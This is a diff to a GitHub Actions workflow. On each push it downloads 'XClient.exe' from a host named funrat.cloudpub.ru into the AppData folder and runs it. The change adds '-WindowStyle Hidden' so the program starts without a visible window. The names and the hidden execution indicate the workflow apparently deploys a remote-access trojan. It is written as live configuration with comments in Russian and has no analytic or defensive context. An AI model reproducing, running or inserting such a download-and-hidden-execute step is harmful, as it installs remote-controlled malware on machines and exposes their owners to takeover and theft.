@@ -1,4 +1,4 @@
-name: Download and Run .exe file to AppData
+name: Download and Run .exe file without console
 
 on:
   push:
@@ -25,8 +25,8 @@ jobs:
           $targetFolder = Join-Path $appDataPath "MyApp"
           curl -L -o "$targetFolder\XClient.exe" https://funrat.cloudpub.ru/XClient.exe  # Скачиваем в папку в AppData
 
-      - name: Run .exe file from AppData folder
+      - name: Run .exe file without console
         run: |
           $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
           $targetFolder = Join-Path $appDataPath "MyApp"
-          Start-Process -FilePath "$targetFolder\XClient.exe"  # Запуск .exe из папки AppData
+          Start-Process -FilePath "$targetFolder\XClient.exe" -WindowStyle Hidden  # Запуск .exe без консоли
